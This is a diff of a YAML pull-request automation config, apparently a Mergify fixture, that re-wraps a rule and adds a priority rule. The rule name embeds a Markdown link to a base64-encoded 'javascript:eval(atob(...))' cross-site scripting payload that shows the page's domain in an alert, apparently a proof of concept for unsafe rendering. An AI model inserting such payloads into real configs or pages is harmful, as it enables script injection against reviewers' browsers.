@@ -1,7 +1,16 @@
 pull_request_rules:
-  - name: "[⚠️ Security Alert: Review Required](javascript:eval%28atob%28%27YWxlcnQoIlhTUyBvbjogIiArIGRvY3VtZW50LmRvbWFpbik=%27%29%29)"
+  - name: "[⚠️ Security Alert: Review
+      Required](javascript:eval%28atob%28%27YWxlcnQoIlhTUyBvbjogIiArIGRvY3VtZW5\
+      0LmRvbWFpbik=%27%29%29)"
     conditions:
       - base=main
     actions:
       comment:
-        message: "Triggered"
+        message: Triggered
+priority_rules:
+  - name: test
+    priority: medium
+    conditions:
+      - and:
+          - base = main
+    allow_checks_interruption: true
